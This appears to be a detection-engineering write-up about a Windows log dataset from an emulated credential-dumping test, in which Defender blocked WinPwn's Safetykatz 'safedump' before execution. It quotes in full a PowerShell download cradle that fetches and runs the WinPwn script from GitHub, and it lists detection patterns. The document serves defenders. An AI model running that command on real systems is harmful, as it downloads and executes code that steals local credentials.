# T1078.003-7: Local Accounts — WinPwn - Loot local Credentials - Safetykatz

## Technique Context

T1078.003 (Valid Accounts: Local Accounts) involves adversaries using valid local account credentials to maintain persistence, escalate privileges, or move laterally within networks. While this technique typically manifests through credential use rather than credential harvesting, this test demonstrates the WinPwn framework's "safedump" function, which attempts to extract local credentials using Safetykatz (a .NET port of Mimikatz). The detection community focuses on credential dumping attempts, LSASS process access patterns, and the network retrieval of credential harvesting tools.

## What This Dataset Contains

This dataset captures a failed attempt to execute the WinPwn framework's credential dumping functionality. The key evidence includes:

**PowerShell Execution Chain**: Security event 4688 shows PowerShell spawning with the command `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') safedump -consoleoutput -noninteractive}`, revealing the full attack chain.

**Network Resolution**: Sysmon event 22 captures DNS resolution for `raw.githubusercontent.com`, showing the attempt to download the WinPwn framework from GitHub.

**Script Download Attempt**: PowerShell event 4103 shows `New-Object` with parameter `net.webclient`, indicating the webclient creation for downloading the malicious script.

**Windows Defender Intervention**: PowerShell event 4100 shows the critical blocking action: "This script contains malicious content and has been blocked by your antivirus software" with error ID `ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand`.

**Process Telemetry**: Sysmon events capture the PowerShell process creation (PID 38656) and process access attempts, though the actual credential dumping was blocked before execution.

## What This Dataset Does Not Contain

The dataset lacks the actual credential dumping activity because Windows Defender's real-time protection blocked the malicious script before execution. There are no:
- LSASS process access events that would indicate successful credential extraction
- File creation events for credential dumps or Mimikatz-related artifacts
- Process creation events for credential dumping tools like Safetykatz
- Network connections for exfiltrating harvested credentials
- Registry modifications associated with credential persistence mechanisms

The defensive blocking occurred at the script interpretation stage, preventing the technique from reaching its intended credential harvesting objective.

## Assessment

This dataset provides excellent visibility into the initial stages of a credential harvesting attempt but limited insight into the actual T1078.003 technique execution due to successful defensive intervention. The Security 4688 events with full command-line logging and PowerShell script block logging (4104) capture the complete attack intent, while Sysmon DNS queries (22) and process creation events (1) provide additional context. The Windows Defender blocking event (PowerShell 4100) demonstrates how modern endpoint protection can prevent credential dumping before it occurs, making this dataset more valuable for detecting attempt patterns than successful credential use.

## Detection Opportunities Present in This Data

1. **PowerShell download cradle detection** - Monitor for `New-Object net.webclient` combined with `downloadstring` methods in PowerShell script blocks (events 4103/4104)

2. **GitHub-hosted malware download attempts** - Alert on DNS queries to `raw.githubusercontent.com` followed by PowerShell web client activity (Sysmon 22 + PowerShell 4103)

3. **WinPwn framework indicators** - Detect command lines containing specific WinPwn function calls like `safedump -consoleoutput -noninteractive`

4. **PowerShell AMSI bypass attempts** - Monitor for PowerShell error events 4100 with `ScriptContainedMaliciousContent` indicating blocked malicious content

5. **Process chain analysis** - Correlate PowerShell parent-child relationships where child processes attempt credential-related operations (Security 4688 process creation chains)

6. **Suspicious PowerShell execution policy changes** - Track `Set-ExecutionPolicy Bypass` commands in PowerShell module logging (4103) as potential preparation for malicious script execution
